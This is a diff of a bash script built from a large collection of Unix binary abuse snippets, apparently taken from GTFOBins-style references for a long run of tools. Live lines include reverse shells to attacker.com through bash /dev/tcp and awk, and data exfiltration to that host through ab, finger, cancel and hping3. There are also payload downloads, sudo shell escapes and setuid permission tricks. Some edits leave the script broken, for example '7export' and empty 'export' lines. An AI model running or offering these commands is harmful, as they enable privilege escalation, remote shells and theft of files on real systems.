@@ -1,7 +1,8 @@
 #!/bin/bash
 touch TestFile.something
-"some data for test " > TestFile.something
-LFILE = TestFile.something
+echo "some data for test" > TestFile.something
+
+LFILE=TestFile.something
 
 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
 
@@ -17,11 +18,11 @@ URL=http://attacker.com/
 URL=http://attacker.com/
 
 sudo ab -p $LFILE $URL
-LFILE=file_to_read
+
 alpine -F "$LFILE"
-LFILE=file_to_read
+
 ./alpine -F "$LFILE"
-LFILE=file_to_read
+
 sudo alpine -F "$LFILE"
 TF=$(mktemp)
 echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
@@ -29,9 +30,9 @@ ansible-playbook $TF
 TF=$(mktemp)
 echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
 sudo ansible-playbook $TF
-LFILE=file_to_read
+
 apache2ctl -c "Include $LFILE" -k stop
-LFILE=file_to_read
+
 sudo apache2ctl -c "Include $LFILE" -k stop
 apt-get changelog apt
 !/bin/sh
@@ -48,15 +49,15 @@ TF=$(mktemp)
 echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
 sudo apt install -c $TF sl
 TF=$(mktemp -u)
-LFILE=file_to_read
+
 ar r "$TF" "$LFILE"
 cat "$TF"
 TF=$(mktemp -u)
-LFILE=file_to_read
+
 ./ar r "$TF" "$LFILE"
 cat "$TF"
 TF=$(mktemp -u)
-LFILE=file_to_read
+
 sudo ar r "$TF" "$LFILE"
 cat "$TF"
 COMMAND='id'
@@ -78,67 +79,72 @@ echo "$COMMAND" > $TF
 chmod +x $TF
 ./aria2c --on-download-error=$TF http://x
 TF=$(mktemp -u)
-LFILE=file_to_read
+
 arj a "$TF" "$LFILE"
 arj p "$TF"
 TF=$(mktemp -d)
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >"$TF/$LFILE"
 arj a "$TF/a" "$TF/$LFILE"
 arj e "$TF/a" $LDIR
 TF=$(mktemp -d)
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >"$TF/$LFILE"
 arj a "$TF/a" "$TF/$LFILE"
 sudo arj e "$TF/a" $LDIR
 TF=$(mktemp -d)
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >"$TF/$LFILE"
 arj a "$TF/a" "$TF/$LFILE"
 ./arj e "$TF/a" $LDIR
-LFILE=file_to_read
+
 arp -v -f "$LFILE"
-LFILE=file_to_read
+
 ./arp -v -f "$LFILE"
-LFILE=file_to_read
+
 sudo arp -v -f "$LFILE"
-LFILE=file_to_read
-as @$LFILE
-LFILE=file_to_read
-./as @$LFILE
-LFILE=file_to_read
-sudo as @$LFILE
-LFILE=file_to_read
+
+#as @$LFILE
+
+#./as @$LFILE
+
+#sudo as @$LFILE
+
 ascii-xfr -ns "$LFILE"
-LFILE=file_to_read
+
 ./ascii-xfr -ns "$LFILE"
-LFILE=file_to_read
+
 sudo ascii-xfr -ns "$LFILE"
-LFILE=file_to_read
+
 ascii85 "$LFILE" | ascii85 --decode
-LFILE=file_to_read
+
 sudo ascii85 "$LFILE" | ascii85 --decode
-export LFILE=file_to_write
+export 
 ash -c 'echo DATA > $LFILE'
-LFILE=file_to_read
+
 aspell -c "$LFILE"
-LFILE=file_to_read
+
 ./aspell -c "$LFILE"
-LFILE=file_to_read
-sudo aspell -c "$LFILE"
-echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+
+#sudo aspell -c "$LFILE"
+#echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 COMMAND=id
-echo "$COMMAND" | at now
-echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
-LFILE=file_to_read
+echo "AT"
+#echo "$COMMAND" | at now
+#echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+
+echo "ATBOM<<<<<"
+
 atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
-LFILE=file_to_read
+
 sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
-LFILE=file_to_read
+
 ./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+
+echo ">>>Line 144!"
 RHOST=attacker.com
 RPORT=12345
 awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
@@ -150,45 +156,45 @@ awk -v LPORT=$LPORT 'BEGIN {
 s = "/inet/tcp/" LPORT "/0/0";
 while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
 while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-LFILE=file_to_write
+
 awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
-LFILE=file_to_read
+
 awk '//' "$LFILE"
-LFILE=file_to_read
+
 ./awk '//' "$LFILE"
 aws help
 !/bin/sh
 sudo aws help
 !/bin/sh
-LFILE=file_to_read
+
 base32 "$LFILE" | base32 --decode
-LFILE=file_to_read
+
 base32 "$LFILE" | base32 --decode
-LFILE=file_to_read
+
 sudo base32 "$LFILE" | base32 --decode
-LFILE=file_to_read
+
 base58 "$LFILE" | base58 --decode
-LFILE=file_to_read
+
 sudo base58 "$LFILE" | base58 --decode
-LFILE=file_to_read
+
 base64 "$LFILE" | base64 --decode
-LFILE=file_to_read
+
 ./base64 "$LFILE" | base64 --decode
-LFILE=file_to_read
+
 sudo base64 "$LFILE" | base64 --decode
-LFILE=file_to_read
+
 basenc --base64 $LFILE | basenc -d --base64
-LFILE=file_to_read
+
 basenc --base64 $LFILE | basenc -d --base64
-LFILE=file_to_read
+
 sudo basenc --base64 $LFILE | basenc -d --base64
-LFILE=file_to_read
+
 basez "$LFILE" | basez --decode
-LFILE=file_to_read
+
 ./basez "$LFILE" | basez --decode
-LFILE=file_to_read
+
 sudo basez "$LFILE" | basez --decode
-export RHOST=attacker.com
+7export RHOST=attacker.com
 export RPORT=12345
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 export RHOST=attacker.com
@@ -209,16 +215,16 @@ export RHOST=attacker.com
 export RPORT=12345
 export LFILE=file_to_get
 bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
-export LFILE=file_to_write
+export 
 bash -c 'echo DATA > $LFILE'
-LFILE=file_to_write
+
 HISTIGNORE='history *'
 history -c
 DATA
 history -w $LFILE
-export LFILE=file_to_read
+export 
 bash -c 'echo "$(<$LFILE)"'
-LFILE=file_to_read
+
 HISTTIMEFORMAT=$'\r\e[K'
 history -r $LFILE
 history
@@ -228,13 +234,13 @@ batcat --paging always /etc/profile
 !/bin/sh
 sudo batcat --paging always /etc/profile
 !/bin/sh
-LFILE=file_to_read
+
 bc -s $LFILE
 quit
-LFILE=file_to_read
+
 sudo bc -s $LFILE
 quit
-LFILE=file_to_read
+
 ./bc -s $LFILE
 quit
 bconsole
@@ -244,11 +250,11 @@ sudo bconsole
 TF=$(mktemp)
 echo 'BEGIN {system("/bin/sh");exit()}' >$TF
 sudo bpftrace $TF
-LFILE=file_to_read
+
 bridge -b "$LFILE"
-LFILE=file_to_read
+
 ./bridge -b "$LFILE"
-LFILE=file_to_read
+
 sudo bridge -b "$LFILE"
 bundle help
 !/bin/sh
@@ -262,10 +268,10 @@ TF=$(mktemp -d)
 touch $TF/Gemfile
 cd $TF
 bundle console
-system('/bin/sh -c /bin/sh')
-TF=$(mktemp -d)
-echo 'system("/bin/sh")' > $TF/Gemfile
-cd $TF
+#system('/bin/sh -c /bin/sh')
+#TF=$(mktemp -d)
+#echo 'system("/bin/sh")' > $TF/Gemfile
+#cd $TF
 bundle install
 sudo bundle help
 !/bin/sh
@@ -280,9 +286,9 @@ bundler exec /bin/sh
 TF=$(mktemp -d)
 touch $TF/Gemfile
 cd $TF
-bundler console
-system('/bin/sh -c /bin/sh')
-TF=$(mktemp -d)
+#bundler console
+#system('/bin/sh -c /bin/sh')
+#TF=$(mktemp -d)
 echo 'system("/bin/sh")' > $TF/Gemfile
 cd $TF
 bundler install
@@ -290,14 +296,14 @@ sudo bundler help
 !/bin/sh
 busctl --show-machine
 !/bin/sh
-busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
-sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
-./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
+#busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+#sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+#./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
 LPORT=12345
 busybox httpd -f -p $LPORT -h .
-LFILE=file_to_write
-busybox sh -c 'echo "DATA" > $LFILE'
-LFILE=file_to_read
+
+# busybox sh -c 'echo "DATA" > $LFILE'
+
 ./busybox cat "$LFILE"
 RHOST=attacker.com
 RPORT=12345
@@ -314,17 +320,17 @@ TF=$(mktemp)
 echo 'system("/bin/sh")' > $TF
 sudo byebug $TF
 continue
-LFILE=file_to_read
+
 bzip2 -c $LFILE | bzip2 -d
-LFILE=file_to_read
+
 ./bzip2 -c $LFILE | bzip2 -d
-LFILE=file_to_read
+
 sudo bzip2 -c $LFILE | bzip2 -d
-LFILE=file_to_read
+
 c89 -x c -E "$LFILE"
 LFILE=file_to_delete
 c89 -xc /dev/null -o $LFILE
-LFILE=file_to_read
+
 c99 -x c -E "$LFILE"
 LFILE=file_to_delete
 c99 -xc /dev/null -o $LFILE
@@ -332,37 +338,37 @@ RHOST=attacker.com
 RPORT=12345
 
 cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
-LFILE=file_to_read
+
 cat "$LFILE"
-LFILE=file_to_read
+
 ./cat "$LFILE"
-LFILE=file_to_read
+
 sudo cat "$LFILE"
 TF=$(mktemp -d)
 certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
 TF=$(mktemp -d)
 sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
-LFILE=file_to_read
+
 check_cups --extra-opts=@$LFILE
-LFILE=file_to_read
+
 sudo check_cups --extra-opts=@$LFILE
-LFILE=file_to_read
+
 OUTPUT=output_file
 check_log -F $LFILE -O $OUTPUT
 cat $OUTPUT
-LFILE=file_to_write
+
 INPUT=input_file
 check_log -F $INPUT -O $LFILE
-LFILE=file_to_write
+
 INPUT=input_file
 sudo check_log -F $INPUT -O $LFILE
-LFILE=file_to_read
+
 check_memory --extra-opts=@$LFILE
-LFILE=file_to_read
+
 sudo check_memory --extra-opts=@$LFILE
-LFILE=file_to_read
+
 check_raid --extra-opts=@$LFILE
-LFILE=file_to_read
+
 sudo check_raid --extra-opts=@$LFILE
 COMMAND=id
 OUTPUT=output_file
@@ -379,9 +385,9 @@ chmod +x $TF
 umask 022
 check_ssl_cert --curl-bin $TF -H example.net
 cat $OUTPUT
-LFILE=file_to_read
+
 check_statusfile $LFILE
-LFILE=file_to_read
+
 sudo check_statusfile $LFILE
 LFILE=file_to_change
 ./chmod 6777 $LFILE
@@ -393,23 +399,23 @@ LFILE=file_to_change
 sudo chown $(id -un):$(id -gn) $LFILE
 ./chroot / /bin/sh -p
 sudo chroot /
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 touch $TF/empty.yara
 clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 touch $TF/empty.yara
 ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 touch $TF/empty.yara
 sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
-LFILE=file_to_read
+
 cmp $LFILE /dev/zero -b -l
-LFILE=file_to_read
+
 ./cmp $LFILE /dev/zero -b -l
-LFILE=file_to_read
+
 sudo cmp $LFILE /dev/zero -b -l
 TF=$(mktemp -d)
 echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
@@ -417,17 +423,17 @@ cobc -xFj --frelax-syntax-checks $TF/x
 TF=$(mktemp -d)
 echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
 sudo cobc -xFj --frelax-syntax-checks $TF/x
-LFILE=file_to_read
+
 column $LFILE
-LFILE=file_to_read
+
 ./column $LFILE
-LFILE=file_to_read
+
 sudo column $LFILE
-LFILE=file_to_read
+
 comm $LFILE /dev/null 2>/dev/null
-LFILE=file_to_read
+
 comm $LFILE /dev/null 2>/dev/null
-LFILE=file_to_read
+
 sudo comm $LFILE /dev/null 2>/dev/null
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
@@ -450,21 +456,21 @@ cowthink -f $TF x
 TF=$(mktemp)
 echo 'exec "/bin/sh";' >$TF
 sudo cowthink -f $TF x
-LFILE=file_to_read
+
 cp "$LFILE" /dev/stdout
-LFILE=file_to_write
+
 echo "DATA" | cp /dev/stdin "$LFILE"
-LFILE=file_to_write
+
 echo "DATA" | ./cp /dev/stdin "$LFILE"
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo "DATA" > $TF
 ./cp $TF $LFILE
 LFILE=file_to_change
 ./cp --attributes-only --preserve=all ./cp "$LFILE"
-LFILE=file_to_write
+
 echo "DATA" | sudo cp /dev/stdin "$LFILE"
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo "DATA" > $TF
 sudo cp $TF $LFILE
@@ -486,31 +492,31 @@ sudo cpan
 ! exec '/bin/bash'
 echo '/bin/sh </dev/tty >/dev/tty' >localhost
 cpio -o --rsh-command /bin/sh -F localhost:
-LFILE=file_to_read
+
 echo "$LFILE" | cpio -o
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 echo "$LFILE" | cpio -dp $TF
 cat "$TF/$LFILE"
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >$LFILE
 echo $LFILE | cpio -up $LDIR
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 echo "$LFILE" | ./cpio -R $UID -dp $TF
 cat "$TF/$LFILE"
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >$LFILE
 echo $LFILE | ./cpio -R 0:0 -p $LDIR
 echo '/bin/sh </dev/tty >/dev/tty' >localhost
 sudo cpio -o --rsh-command /bin/sh -F localhost:
-LFILE=file_to_read
+
 TF=$(mktemp -d)
 echo "$LFILE" | sudo cpio -R $UID -dp $TF
 cat "$TF/$LFILE"
-LFILE=file_to_write
+
 LDIR=where_to_write
 echo DATA >$LFILE
 echo $LFILE | sudo cpio -R 0:0 -p $LDIR
@@ -520,34 +526,34 @@ COMMAND='/usr/bin/id'
 CRASHPAGER="$COMMAND" crash -h
 sudo crash -h
 !sh
-export LFILE=file_to_write
-ash -c 'echo DATA > $LFILE'
-LFILE=file_to_read
+export 
+#ash -c 'echo DATA > $LFILE'
+
 csplit $LFILE 1
 cat xx01
 TF=$(mktemp)
 echo "DATA" > $TF
-LFILE=file_to_write
+
 csplit -z -b "%d$LFILE" $TF 1
-LFILE=file_to_read
+
 csplit $LFILE 1
 cat xx01
-LFILE=file_to_read
+
 csplit $LFILE 1
 cat xx01
-LFILE=file_to_read
+
 csvtool trim t $LFILE
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo DATA > $TF
 csvtool trim t $TF -o $LFILE
-LFILE=file_to_read
+
 ./csvtool trim t $LFILE
-LFILE=file_to_read
+
 cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
-LFILE=file_to_read
+
 sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
-LFILE=file_to_read
+
 ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
 URL=http://attacker.com/
 
@@ -557,7 +563,7 @@ URL=http://attacker.com/file_to_get
 curl $URL -o $LFILE
 LFILE=/tmp/file_to_read
 curl file://$LFILE
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo DATA >$TF
 curl "file://$TF" -o "$LFILE"
@@ -567,27 +573,27 @@ URL=http://attacker.com/file_to_get
 URL=http://attacker.com/file_to_get
 
 sudo curl $URL -o $LFILE
-LFILE=file_to_read
+
 cut -d "" -f1 "$LFILE"
-LFILE=file_to_read
+
 ./cut -d "" -f1 "$LFILE"
-LFILE=file_to_read
+
 sudo cut -d "" -f1 "$LFILE"
-export LFILE=file_to_write
-dash -c 'echo DATA > $LFILE'
-LFILE=file_to_read
+export 
+#dash -c 'echo DATA > $LFILE'
+
 date -f $LFILE
-LFILE=file_to_read
+
 ./date -f $LFILE
-LFILE=file_to_read
+
 sudo date -f $LFILE
-LFILE=file_to_write
+
 echo "DATA" | dd of=$LFILE
-LFILE=file_to_read
+
 dd if=$LFILE
-LFILE=file_to_write
+
 echo "data" | ./dd of=$LFILE
-LFILE=file_to_write
+
 echo "data" | sudo dd of=$LFILE
 debugfs
 !/bin/sh
@@ -595,28 +601,28 @@ debugfs
 !/bin/sh
 sudo debugfs
 !/bin/sh
-LFILE=file_to_read
+
 dialog --textbox "$LFILE" 0 0
-LFILE=file_to_read
+
 ./dialog --textbox "$LFILE" 0 0
-LFILE=file_to_read
+
 sudo dialog --textbox "$LFILE" 0 0
-LFILE=file_to_read
+
 diff --line-format=%L /dev/null $LFILE
 LFOLDER=folder_to_list
 TF=$(mktemp -d)
 diff --recursive $TF $LFOLDER
-LFILE=file_to_read
+
 ./diff --line-format=%L /dev/null $LFILE
-LFILE=file_to_read
+
 sudo diff --line-format=%L /dev/null $LFILE
-LFILE=file_to_read
+
 dig -f $LFILE
-LFILE=file_to_read
+
 sudo dig -f $LFILE
-LFILE=file_to_read
+
 ./dig -f $LFILE
-LFILE=file_to_read
+
 dmesg -rF "$LFILE"
 dmesg -H
 !/bin/sh
@@ -632,7 +638,7 @@ TF=$(mktemp)
 echo "DATA" > $TF
 ./dmiwrite $TF x.dmi
 ```
-LFILE=file_to_write
+
 sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
 sudo dmsetup create base <<EOF
 0 3534848 linear /dev/loop0 94208
@@ -668,19 +674,19 @@ LFILE2=LFILE2.txt
 
 dos2unix -f -n "$LFILE1" "$LFILE2"
 LFILE='\path\to\file_to_read'
-dosbox -c 'mount c /' -c "type c:$LFILE"
+#dosbox -c 'mount c /' -c "type c:$LFILE"
 LFILE='\path\to\file_to_read'
-dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
+#dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
 cat '/tmp/OUTPUT'
 LFILE='\path\to\file_to_write'
-dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+#dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
 LFILE='\path\to\file_to_write'
-./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+#./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
 LFILE='\path\to\file_to_write'
-sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+#sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
 dotnet fsi
 System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
-export LFILE=file_to_read
+export 
 dotnet fsi
 System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;
 sudo dotnet fsi
@@ -707,7 +713,7 @@ sudo dvips -R0 texput.dvi
 tex '\special{psfile="`/bin/sh 1>&0"}\end'
 ./dvips -R0 texput.dvi
 TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+#echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 easy_install $TF
 export RHOST=attacker.com
 export RPORT=12345
@@ -736,7 +742,7 @@ export URL=http://attacker.com/file_to_get
 export LFILE=/tmp/file_to_save
 TF=$(mktemp -d)
 echo "import os;
-os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
+#os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
@@ -744,7 +750,7 @@ pip install $TF
 export LFILE=/tmp/file_to_save
 TF=$(mktemp -d)
 echo "import os;
-os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
+#os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
 easy_install $TF
 TF=$(mktemp -d)
 echo 'print(open("file_to_read").read())' > $TF/setup.py
@@ -753,7 +759,7 @@ TF=$(mktemp -d)
 echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
 easy_install $TF
 TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+#echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo easy_install $TF
 eb logs
 !/bin/sh
@@ -777,28 +783,28 @@ sudo ed
 !/bin/sh
 ./ed
 !/bin/sh
-LFILE=file_to_read
+
 ./efax -d "$LFILE"
-LFILE=file_to_read
+
 sudo efax -d "$LFILE"
-export LFILE=file_to_read
+export 
 elvish -c 'echo (slurp <$E:LFILE)'
-export LFILE=file_to_write
+export 
 elvish -c 'echo DATA >$E:LFILE'
 emacs file_to_write
 DATA
 C-x C-s
-LFILE=file_to_read
+
 eqn "$LFILE"
-LFILE=file_to_read
+
 ./eqn "$LFILE"
-LFILE=file_to_read
+
 sudo eqn "$LFILE"
-LFILE=file_to_read
+
 espeak -qXf "$LFILE"
-LFILE=file_to_read
+
 ./espeak -qXf "$LFILE"
-LFILE=file_to_read
+
 sudo espeak -qXf "$LFILE"
 ex
 !/bin/sh
@@ -813,23 +819,23 @@ ex file_to_read
 q
 sudo ex
 !/bin/sh
-LFILE=file_to_read
+
 OUTPUT=output_file
 exiftool -filename=$OUTPUT $LFILE
 cat $OUTPUT
-LFILE=file_to_write
+
 INPUT=input_file
 exiftool -filename=$LFILE $INPUT
-LFILE=file_to_write
+
 INPUT=input_file
 sudo exiftool -filename=$LFILE $INPUT
-LFILE=file_to_read
+
 expand "$LFILE"
-LFILE=file_to_read
+
 ./expand "$LFILE"
-LFILE=file_to_read
+
 sudo expand "$LFILE"
-LFILE=file_to_read
+
 expect $LFILE
 TF=$(mktemp -d)
 echo 'exec("/bin/sh")' > $TF/x.rb
@@ -837,18 +843,18 @@ FACTERLIB=$TF facter
 TF=$(mktemp -d)
 echo 'exec("/bin/sh")' > $TF/x.rb
 sudo FACTERLIB=$TF facter
-LFILE=file_to_read
+
 file -f $LFILE
 Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.
 If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.
 It can also be provided with a directory and will read each file in the directory.
-LFILE=file_to_read
+
 file -m $LFILE
-LFILE=file_to_read
+
 ./file -f $LFILE
-LFILE=file_to_read
+
 sudo file -f $LFILE
-LFILE=file_to_write
+
 find / -fprintf "$FILE" DATA -quit
 RHOST=attacker.com
 
@@ -856,23 +862,23 @@ finger "$(base64 $LFILE)@$RHOST"
 RHOST=attacker.com
 
 finger x@$RHOST | base64 -d > "$LFILE"
-LFILE=file_to_read
+
 fmt -pNON_EXISTING_PREFIX "$LFILE"
-LFILE=file_to_read
+
 fmt -999 "$LFILE"
-LFILE=file_to_read
+
 ./fmt -999 "$LFILE"
-LFILE=file_to_read
+
 sudo fmt -999 "$LFILE"
-LFILE=file_to_read
+
 fold -w99999999 "$LFILE"
-LFILE=file_to_read
+
 ./fold -w99999999 "$LFILE"
-LFILE=file_to_read
+
 sudo fold -w99999999 "$LFILE"
-LFILE=file_to_read
+
 fping -f $LFILE
-LFILE=file_to_read
+
 sudo fping -f $LFILE
 ftp
 !/bin/sh
@@ -895,15 +901,15 @@ gawk -v LPORT=$LPORT 'BEGIN {
 s = "/inet/tcp/" LPORT "/0/0";
 while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
 while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-LFILE=file_to_write
+
 gawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
-LFILE=file_to_read
+
 gawk '//' "$LFILE"
-LFILE=file_to_read
+
 ./gawk '//' "$LFILE"
-LFILE=file_to_read
+
 gcc -x c -E "$LFILE"
-LFILE=file_to_read
+
 gcc @"$LFILE"
 LFILE=file_to_delete
 gcc -xc /dev/null -o $LFILE
@@ -934,7 +940,7 @@ gdb -nx -ex 'python import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
-LFILE=file_to_write
+
 gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
 gem open rdoc
 :!/bin/sh
@@ -944,11 +950,11 @@ gem build $TF/x
 TF=$(mktemp -d)
 echo 'system("/bin/sh")' > $TF/x
 gem install --file $TF/x
-LFILE=file_to_read
+
 genisoimage -q -o - "$LFILE"
-LFILE=file_to_read
+
 ./genisoimage -sort "$LFILE"
-LFILE=file_to_read
+
 sudo genisoimage -q -o - "$LFILE"
 export RHOST=attacker.com
 export RPORT=12345
@@ -992,7 +998,7 @@ git -C "$TF" commit --allow-empty -m x
 TF=$(mktemp -d)
 ln -s /bin/sh "$TF/git-x"
 git "--exec-path=$TF" x
-LFILE=file_to_read
+
 git diff /dev/null $LFILE
 git apply --unsafe-paths --directory / x.patch
 sudo git -p help config
@@ -1007,13 +1013,13 @@ sudo git -C "$TF" commit --allow-empty -m x
 TF=$(mktemp -d)
 ln -s /bin/sh "$TF/git-x"
 sudo git "--exec-path=$TF" x
-LFILE=file_to_read
+
 grep '' $LFILE
-LFILE=file_to_read
+
 ./grep '' $LFILE
-LFILE=file_to_read
+
 sudo grep '' $LFILE
-LFILE=file_to_write
+
 gtester "DATA" -o $LFILE
 TF=$(mktemp)
 echo '#!/bin/sh' > $TF
@@ -1030,37 +1036,37 @@ echo '#!/bin/sh -p' > $TF
 echo 'exec /bin/sh -p 0<&1' >> $TF
 chmod +x $TF
 sudo gtester -q $TF
-LFILE=file_to_read
+
 gzip -f $LFILE -t
-LFILE=file_to_read
+
 gzip -c $LFILE | gzip -d
-LFILE=file_to_read
+
 ./gzip -f $LFILE -t
-LFILE=file_to_read
+
 sudo gzip -f $LFILE -t
-LFILE=file_to_read
+
 hd "$LFILE"
-LFILE=file_to_read
+
 ./hd "$LFILE"
-LFILE=file_to_read
+
 sudo hd "$LFILE"
-LFILE=file_to_read
+
 head -c1G "$LFILE"
-LFILE=file_to_read
+
 ./head -c1G "$LFILE"
-LFILE=file_to_read
+
 sudo head -c1G "$LFILE"
-LFILE=file_to_read
+
 hexdump -C "$LFILE"
-LFILE=file_to_read
+
 ./hexdump -C "$LFILE"
-LFILE=file_to_read
+
 sudo hexdump -C "$LFILE"
-LFILE=file_to_read
+
 highlight --no-doc --failsafe "$LFILE"
-LFILE=file_to_read
+
 ./highlight --no-doc --failsafe "$LFILE"
-LFILE=file_to_read
+
 sudo highlight --no-doc --failsafe "$LFILE"
 hping3
 /bin/sh
@@ -1073,15 +1079,15 @@ The file is continuously sent, adjust the `--count` parameter or kill the sender
 sudo hping3 --icmp --listen xxx --dump
 ```
 RHOST=attacker.com
-LFILE=file_to_read
+
 sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
-LFILE=file_to_write
+
 echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
-LFILE=file_to_read
+
 iconv -f 8859_1 -t 8859_1 "$LFILE"
-LFILE=file_to_read
+
 ./iconv -f 8859_1 -t 8859_1 "$LFILE"
-LFILE=file_to_read
+
 ./iconv -f 8859_1 -t 8859_1 "$LFILE"
 iftop
 !/bin/sh
@@ -1095,14 +1101,14 @@ TF=$(mktemp)
 LFILE=file_to_change
 TF=$(mktemp)
 sudo install -m 6777 $LFILE $TF
-LFILE=file_to_read
+
 ip -force -batch "$LFILE"
-LFILE=file_to_read
+
 ./ip -force -batch "$LFILE"
 ./ip netns add foo
 ./ip netns exec foo /bin/sh -p
 ./ip netns delete foo
-LFILE=file_to_read
+
 sudo ip -force -batch "$LFILE"
 sudo ip netns add foo
